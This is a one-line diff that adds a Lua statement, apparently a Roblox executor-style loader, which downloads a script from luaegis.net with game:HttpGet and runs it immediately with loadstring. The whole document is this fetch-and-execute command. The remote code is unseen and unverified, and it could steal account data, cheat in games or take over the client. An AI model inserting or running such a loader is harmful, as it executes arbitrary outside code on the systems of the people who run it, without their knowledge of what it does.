@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://luaegis.net/scripts/v4/loaders/de2eb163-94d6-47e0-8278-f8063c2e256a.lua"))()
